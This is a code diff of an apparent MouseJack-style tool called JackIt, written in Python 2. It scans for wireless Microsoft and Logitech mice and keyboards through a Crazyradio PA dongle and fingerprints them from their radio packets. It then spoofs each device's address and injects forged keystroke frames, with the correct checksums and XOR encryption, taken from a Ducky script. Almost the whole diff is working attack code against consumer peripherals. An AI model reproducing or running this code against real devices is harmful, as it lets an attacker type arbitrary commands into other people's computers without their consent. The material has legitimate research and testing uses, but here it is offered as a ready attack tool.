@@ -22,15 +22,6 @@ P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
-# some constants for fingerprinting
-MS_MOUSE = 1
-MS_MOUSE_ENC = 2
-MS_KEYBOARD_ENC = 3
-LOG_MOUSE = 4
-LOG_KEYBOARD = 5
-
-enable_debug = False
-
 
 class DuckyParser(object):
     ''' Help map ducky like script to HID codes to be sent '''
@@ -242,18 +233,15 @@ class DuckyParser(object):
         return entries
 
 
-class NordicScanner(object):
+class JackIt(object):
     ''' Class for scanning, pinging and fingerprint devices '''
 
-    def __init__(self, radio, ack_timeout=5, retries=1, debug=False):
-        self.radio = radio
+    def __init__(self, disable_lna=False, debug=False):
         self.channels = range(2, 84)
         self.channel_index = 0
         self.debug = debug
         self.devices = {}
-        self.ack_timeout = max(0, min(ack_timeout, 15))
-        self.retries = max(0, min(retries, 15))
-        self.ping_payload = '0F:0F:0F:0F'.replace(':', '').decode('hex')
+        self.init_radio(disable_lna)
 
     def _debug(self, text):
         if self.debug:
@@ -261,6 +249,23 @@ class NordicScanner(object):
 
     def hexify(self, data):
         return ':'.join('{:02X}'.format(x) for x in data)
+
+    def unhexify_addr(self, val):
+        return self.unhexify(val)[::-1][:5]
+
+    def unhexify(self, val):
+        return val.replace(':', '').decode('hex')
+
+    def serialize_payload(self, p):
+        return str(bytearray(p))
+
+    def serialize_address(self, a):
+        return ''.join(chr(b) for b in a[::-1])
+
+    def init_radio(self, disable_lna):
+        self.radio = nrf24.nrf24(0)
+        if not disable_lna:
+            self.radio.enable_lna()
 
     def scan(self, timeout=5.0):
         # Put the radio in promiscuous mode
@@ -297,315 +302,195 @@ class NordicScanner(object):
                             self.devices[a]['device'] = self.fingerprint_device(payload)
                             self.devices[a]['payload'] = payload
                     else:
-                        self.devices[a] = {'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload, 'device': 0}
+                        self.devices[a] = {'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload, 'device': ''}
                         self.devices[a]['timestamp'] = time.time()
                         if payload and self.fingerprint_device(payload):
                             self.devices[a]['device'] = self.fingerprint_device(payload)
 
         except RuntimeError:
+            print R + '[!] ' + W + 'Runtime error during scan'
             exit(-1)
         return self.devices
 
     def sniff(self, address):
         self.radio.enter_sniffer_mode(''.join(chr(b) for b in address[::-1]))
 
-    def acquire_channel(self, address):
-        addr = ''.join(chr(b) for b in address[::-1])
-        self.radio.enter_sniffer_mode(addr)
+    def find_channel(self, address):
+        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
+        self.radio.enter_sniffer_mode(self.serialize_address(address))
         for channel in range(2, 84):
             self.radio.set_channel(channel)
-            if self.radio.transmit_payload(self.ping_payload, self.ack_timeout, self.retries):
+            if self.radio.transmit_payload(self.serialize_payload(ping), 5, 1):
                 return channel
         return None
+
+    def set_channel(self, channel):
+        self.current_channel = channel
+        self.radio.set_channel(channel)
+
+    def transmit_hook(self, payload):
+        self._debug("Sending: " + self.hexify(payload))
+
+    def transmit_payload(self, payload):
+        self.transmit_hook(payload)
+        return self.radio.transmit_payload(self.serialize_payload(payload), 4, 15)
 
     def fingerprint_device(self, p):
         if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
             # Most likely a non-XOR encrypted Microsoft mouse
-            return MS_MOUSE
+            return 'Microsoft HID'
         elif len(p) == 19 and p[0] == 0x0a:
             # Most likely an XOR encrypted Microsoft mouse
-            return MS_MOUSE_ENC
-        elif len(p) == 16 and p[0] == 0x0a:
-            # Most likely an XOR encrypted Microsoft keyboard
-            return MS_KEYBOARD_ENC
+            return 'MS Encrypted HID'
         elif len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
             # Definitely a logitech mouse movement packet
-            return LOG_MOUSE
+            return 'Logitech HID'
         elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3:
             # Definitely a logitech keystroke packet
-            return LOG_KEYBOARD
+            return 'Logitech HID'
         elif len(p) == 5 and p[0] == 0 and p[1] == 0x40:
             # Most likely logitech keepalive packet
-            return LOG_MOUSE
+            return 'Logitech HID'
         elif len(p) == 10 and p[0] == 0 and p[1] == 0x4F:
             # Most likely logitech sleep timer packet
-            return LOG_MOUSE
+            return 'Logitech HID'
         else:
-            return 0
+            return ''
+
+    def attack(self, hid, attack):
+        for key in attack:
+            if key['hid']:
+                frames = hid.build_frames(key)
+                for frame in frames:
+                    self.transmit_payload(frame[0])
+                    time.sleep(frame[1] / 1000.0)
+            elif key['sleep']:
+                time.sleep(int(key['sleep']) / 1000.0)
 
 
 class MicrosoftHID(object):
-    ''' Injection code for MS devices '''
+    ''' Injection code for MS mouse '''
 
-    def __init__(self, detect, radio, address, payload, key_delay):
-        self.radio = radio
+    def __init__(self, address, payload):
         self.address = address
-        self.string_address = self.hexify(address)
-        self.raw_address = self.unhexify_addr(self.string_address)
-        self.payload = payload[:]
-        self.ack_timeout = 4
-        self.retries = 15
         self.device_vendor = 'Microsoft'
-        self.key_delay = key_delay
+        self.sequence_num = 0
+        self.payload_template = payload[:].tolist()
+        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+        self.payload_template[6] = 67
 
-        # MS attacks are a little more varied
-        # Some older devices send everything in the clear
-        # Some send keystrokes encrypted and mouse data with XOR obfuscation
-        # Some send mouse and key data encrypted
-
-        # It's also worth mentioning that we need to see a
-        # real MS frame before we attack. There are a bunch
-        # of numbers in the header that need to match
-        if detect == MS_MOUSE:
-            self.device_type = 2
-            self.encrypted = False
-            self.payload = self.payload.tolist()
-            self.payload[4:6] = [0, 0]
-            self.payload[6] = 67
-        elif detect == MS_MOUSE_ENC:
-            self.device_type = 2
-            self.encrypted = True
-            self.payload = self.xor_crypt(self.payload)
-            self.payload = self.payload.tolist()
-            self.payload[4:6] = [0, 0]
-            self.payload[6] = 67
-        elif detect == MS_KEYBOARD_ENC:
-            self.device_type = 1
-            self.encrypted = True
-            self.payload = self.xor_crypt(self.payload)
-            self.payload = self.payload.tolist()
-            self.payload[4:6] = [0, 0]
-            self.payload[6] = 67
-        else:
-            raise ValueError('Not recognized as MS device')
-
-        self.clear_payload()
-
-    def hexify(self, val):
-        return ':'.join('{:02X}'.format(b) for b in val)
-
-    def unhexify_addr(self, val):
-        return self.unhexify(val)[::-1][:5]
-
-    def unhexify(self, val):
-        return val.replace(':', '').decode('hex')
-
-    def xor_crypt(self, pay):
-        # MS encryption algorithm - as per KeyKeriki paper
-        p = pay[:]
-        for i in range(4, len(p)):
-            p[i] ^= ord(self.raw_address[(i - 4) % 5])
-        return p
-
-    def serialize_payload(self, p):
-        if self.encrypted:
-            return str(bytearray(self.xor_crypt(p)))
-        else:
-            return str(bytearray(p))
-
-    def checksum(self):
+    def checksum(self, payload):
         # MS checksum algorithm - as per KeyKeriki paper
-        self.payload[-1] = 0
-        for i in range(0, len(self.payload) - 1):
-            self.payload[-1] ^= self.payload[i]
-        self.payload[-1] = ~self.payload[-1] & 0xff
+        payload[-1] = 0
+        for i in range(0, len(payload) - 1):
+            payload[-1] ^= payload[i]
+        payload[-1] = ~payload[-1] & 0xff
+        return payload
 
-    def inc_sequence(self):
+    def sequence(self, payload):
         # MS frames use a 2 bytes sequence number
-        if self.payload[4] == 255:
-            self.payload[5] += 1
-            self.payload[4] = 0
-        else:
-            self.payload[4] += 1
+        payload[5] = (self.sequence_num >> 8) & 0xff
+        payload[4] = self.sequence_num & 0xff
+        self.sequence_num += 1
+        return payload
 
-    def set_key(self, key):
-        if self.device_type == 1:
-            self.payload[7] = 0
-            self.payload[9] = key['hid']
-            # FIXME: seem to be missing the Ctrl and Alt flags
-            # for MS keyboards
-            if key['meta']:
-                self.payload[7] |= 0x08
-            if key['shift']:
-                self.payload[7] |= 0x20
-        else:
-            self.payload[7] = 0
-            self.payload[9] = key['hid']
-            if key['meta']:
-                self.payload[7] |= 0x08
-            if key['alt']:
-                self.payload[7] |= 0x04
-            if key['shift']:
-                self.payload[7] |= 0x02
-            if key['ctrl']:
-                self.payload[7] |= 0x01
+    def key(self, payload, key):
+        payload[7] = 0
+        payload[9] = key['hid']
+        if key['meta']:
+            payload[7] |= 0x08
+        if key['alt']:
+            payload[7] |= 0x04
+        if key['shift']:
+            payload[7] |= 0x02
+        if key['ctrl']:
+            payload[7] |= 0x01
+        return payload
 
-    def clear_payload(self):
-        if self.device_type == 1:
-            self.payload[7:15] = [0, 0, 0, 0, 0, 0, 0, 0]
-        else:
-            self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+    def build_frames(self, key):
+        transmission = []
+        while self.sequence_num < 5:
+            null = self.checksum(self.sequence(self.payload_template[:]))
+            transmission.append([null, 0])
 
-    def post_keystroke_delay(self):
-        if self.key_delay:
-            time.sleep(self.key_delay / 1000.0)
-        else:
-            # Some MS devices will work with 0 delay
-            # Others (encrypted devices during testing) required 5 ms or
-            # keys would be dropped
-            time.sleep(0.005)
+        payload = self.checksum(self.key(self.sequence(self.payload_template[:]), key))
+        null = self.checksum(self.sequence(self.payload_template[:]))
+        transmission += [[payload, 0], [null, 0]]
+        return transmission
 
-    def send_key(self, c=None):
-        if not c:
-            self.clear_payload()
-            self.transmit()
-        else:
-            self.set_key(c)
-            self.transmit()
 
-    def transmit(self):
-        self.inc_sequence()
-        self.checksum()
-        self.radio.transmit_payload(self.serialize_payload(self.payload), self.ack_timeout, self.retries)
-        self.post_keystroke_delay()
+class MicrosoftEncHID(MicrosoftHID):
+    ''' Injection code for MS mouse (encrypted) '''
 
-    def send_attack(self, attack):
-        # We need to force the device to re-sync starting at 
-        # sequence number 0
-        for _ in range(5):
-            self.send_key()
+    def __init__(self, address, payload):
+        self.address = address
+        self.device_vendor = 'Microsoft'
+        self.sequence_num = 0
+        self.payload_template = self.xor_crypt(payload[:].tolist())
+        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+        self.payload_template[6] = 67
 
-        with click.progressbar(attack) as bar:
-            for c in bar:
-                if c['hid']:
-                    self.send_key(c)
-                    # Need to send a null after the HID code, otherwise the key is "stuck"
-                    self.send_key()
-                elif c['sleep']:
-                    time.sleep(int(c['sleep']) / 1000.0)
+    def xor_crypt(self, payload):
+        # MS encryption algorithm - as per KeyKeriki paper
+        raw_address = self.address[::-1][:5]
+        for i in range(4, len(payload)):
+            payload[i] ^= raw_address[(i - 4) % 5]
+        return payload
 
-        self.send_key()
+    def build_frames(self, key):
+        transmission = []
+        while self.sequence_num < 5:
+            null = self.xor_crypt(self.checksum(self.sequence(self.payload_template[:])))
+            transmission.append([null, 5])
+
+        payload = self.xor_crypt(self.checksum(self.key(self.sequence(self.payload_template[:]), key)))
+        null = self.xor_crypt(self.checksum(self.sequence(self.payload_template[:])))
+        transmission += [[payload, 5], [null, 5]]
+        return transmission
 
 
 class LogitechHID(object):
     ''' Injection for Logitech devices '''
 
-    def __init__(self, detect, radio, address, payload, key_delay):
-        self.radio = radio
+    def __init__(self, address, payload):
         self.address = address
-        self.string_address = self.hexify(address)
-        self.raw_address = self.unhexify_addr(self.string_address)
-        self.payload = payload[:]
-        self.ack_timeout = 4
-        self.retries = 15
         self.device_vendor = 'Logitech'
-        self.key_delay = key_delay
-
-        # We always use mouse frames anyway
-        # "mouse frames" isn't strictly accurate -- multimedia key frames look the same
-        # If you read up on the HID++ protocol the attack is pretty obvious IMHO
-
-        # For logitech, we can create a frame from scratch
-        # but we still need a frame to tell us that it's Logitech
-        # And we need to know the address of the device to hijack
-        if detect == LOG_MOUSE:
-            self.device_type = 2
-            self.encrypted = False
-        elif detect == LOG_KEYBOARD:
-            self.device_type = 1
-            self.encrypted = True
-        else:
-            raise ValueError('Not recognized as Logitech device')
-
-        self.clear_payload()
-
-    def hexify(self, val):
-        return ':'.join('{:02X}'.format(b) for b in val)
-
-    def unhexify_addr(self, val):
-        return self.unhexify(val)[::-1][:5]
-
-    def unhexify(self, val):
-        return val.replace(':', '').decode('hex')
-
-    def serialize_payload(self, p):
-        return str(bytearray(p))
-
-    def checksum(self):
-        # This is also from the KeyKeriki paper
-        # Thanks Thorsten and Max!
-        cksum = 0xff
-        for n in range(0, len(self.payload) - 1):
-            cksum = (cksum - self.payload[n]) & 0xff
-        cksum = (cksum + 1) & 0xff
-        self.payload[-1] = cksum
-
-    def set_key(self, key):
-        self.payload[2] = 0
-        self.payload[3] = key['hid']
-        if key['meta']:
-            self.payload[2] |= 0x08
-        if key['alt']:
-            self.payload[2] |= 0x04
-        if key['shift']:
-            self.payload[2] |= 0x02
-        if key['ctrl']:
-            self.payload[2] |= 0x01
-
-    def clear_payload(self):
         # Mouse frames use type 0xC2
         # Multmedia key frames use type 0xC3
         # To see why this works, read diagram 2.3.2 of:
         # https://lekensteyn.nl/files/logitech/Unifying_receiver_DJ_collection_specification_draft.pdf
         # (discovered by wiresharking usbmon)
-        self.payload = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
+        self.payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
 
-    def post_keystroke_delay(self):
-        if self.key_delay:
-            time.sleep(self.key_delay / 1000.0)
-        else:
-            # This could use some tuning
-            # Tested on macOS, 5 ms was too fast and dropped keys
-            time.sleep(0.01)
+    def checksum(self, payload):
+        # This is also from the KeyKeriki paper
+        # Thanks Thorsten and Max!
+        cksum = 0xff
+        for n in range(0, len(payload) - 1):
+            cksum = (cksum - payload[n]) & 0xff
+        cksum = (cksum + 1) & 0xff
+        payload[-1] = cksum
+        return payload
 
-    def send_key(self, c=None):
-        if not c:
-            self.clear_payload()
-            self.transmit()
-        else:
-            self.set_key(c)
-            self.transmit()
+    def key(self, payload, key):
+        payload[2] = 0
+        payload[3] = key['hid']
+        if key['meta']:
+            payload[2] |= 0x08
+        if key['alt']:
+            payload[2] |= 0x04
+        if key['shift']:
+            payload[2] |= 0x02
+        if key['ctrl']:
+            payload[2] |= 0x01
+        return payload
 
-    def transmit(self):
-        self.checksum()
-        self.radio.transmit_payload(self.serialize_payload(self.payload), self.ack_timeout, self.retries)
-        self.post_keystroke_delay()
-
-    def send_attack(self, attack):
-        with click.progressbar(attack) as bar:
-            for c in bar:
-                if c['hid']:
-                    self.send_key(c)
-                    # Need to send a null after the HID code, otherwise the key is "stuck"
-                    self.send_key()
-                elif c['sleep']:
-                    time.sleep(int(c['sleep']) / 1000.0)
-        self.send_key()
-
-
-def _debug(debug, text):
-    if debug:
-        print P + "[D] " + W + text
+    def build_frames(self, key):
+        transmission = []
+        payload = self.checksum(self.key(self.payload_template[:], key))
+        null = self.checksum(self.payload_template[:])
+        transmission += [[payload, 10], [null, 10]]
+        return transmission
 
 
 def banner():
@@ -635,8 +520,7 @@ def confirmroot():
 @click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
 @click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
-@click.option('--keydelay', default=0, help="Inter-key delay in milliseconds", type=click.INT)
-def cli(debug, script, lowpower, interval, keydelay):
+def cli(debug, script, lowpower, interval):
 
     banner()
     confirmroot()
@@ -655,21 +539,12 @@ def cli(debug, script, lowpower, interval, keydelay):
 
     # Initialize the radio
     try:
-        radio = nrf24.nrf24(0)
+        jack = JackIt(lowpower, debug)
     except Exception as e:
         if e.__str__() == "Cannot find USB dongle.":
             print R + "[!] " + W + "Cannot find Crazy PA USB dongle."
             print R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware."
             exit(-1)
-
-    # Assume Crazyradio PA
-    if lowpower:
-        print G + "[+] " + W + "Low power mode enabled"
-    else:
-        radio.enable_lna()
-
-    # Create scanner instance
-    scan = NordicScanner(radio=radio, debug=debug)
 
     print G + "[+] " + W + 'Scanning...'
 
@@ -677,7 +552,7 @@ def cli(debug, script, lowpower, interval, keydelay):
     try:
         try:
             while True:
-                devices = scan.scan(interval)
+                devices = jack.scan(interval)
 
                 click.clear()
                 print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
@@ -694,7 +569,7 @@ def cli(debug, script, lowpower, interval, keydelay):
                         device['count'],
                         str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
                         device['device'],
-                        scan.hexify(device['payload'])
+                        jack.hexify(device['payload'])
                     ])
 
                 print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"])
@@ -736,32 +611,34 @@ def cli(debug, script, lowpower, interval, keydelay):
             device_type = target['device']
 
             # Sniffer mode allows us to spoof the address
-            scan.sniff(address)
-            device = None
+            jack.sniff(address)
+            hid = None
             # Figure out what we've got
-            device_type = scan.fingerprint_device(payload)
-            if device_type == MS_MOUSE or device_type == MS_MOUSE_ENC or device_type == MS_KEYBOARD_ENC:
-                device = MicrosoftHID(device_type, radio, address, payload, keydelay)
-            elif device_type == LOG_MOUSE or device_type == LOG_KEYBOARD:
-                device = LogitechHID(device_type, radio, address, payload, keydelay)
+            device_type = jack.fingerprint_device(payload)
+            if device_type == 'Microsoft HID':
+                hid = MicrosoftHID(address, payload)
+            elif device_type == 'MS Encrypted HID':
+                hid = MicrosoftEncHID(address, payload)
+            elif device_type == 'Logitech HID':
+                hid = LogitechHID(address, payload)
 
-            if device:
+            if hid:
                 # Attempt to ping the devices to find the current channel
-                lock_channel = scan.acquire_channel(address)
+                lock_channel = jack.find_channel(address)
 
                 if lock_channel:
                     print GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,)
-                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, lock_channel)
-                    device.send_attack(attack)
+                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel)
+                    jack.attack(hid, attack)
                 else:
                     # If our pings fail, go full hail mary
                     print R + '[-] ' + W + 'Ping failed, trying all channels'
                     for channel in channels:
-                        radio.set_channel(channel)
-                        print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, channel)
-                        device.send_attack(attack)
+                        jack.set_channel(channel)
+                        print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel)
+                        jack.attack(hid, attack)
             else:
-                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (scan.hexify(address))
+                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address))
                 continue
 
         print GR + '\n[+] ' + W + "All attacks completed\n"
